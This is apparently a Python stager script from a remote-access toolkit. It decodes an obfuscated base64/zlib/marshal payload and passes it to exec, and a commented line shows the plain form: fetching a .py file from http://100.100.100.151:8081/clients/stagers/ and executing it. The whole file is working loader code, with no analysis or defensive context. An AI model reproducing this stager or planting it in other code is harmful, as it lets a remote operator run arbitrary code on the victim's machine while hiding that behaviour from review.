import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrdWFgYCgtyskvSM3TUM8oKSmw0tc3NDDQg2NTQysLAwtD/eSczNS8kmL94pLE9NSiYv3E8Hy9gkp1Tb2i1MQUDU0A9sEVZg==')))))
#exec(eval("urlopen('http://100.100.100.151:8081/clients/stagers/aWo.py').read()"))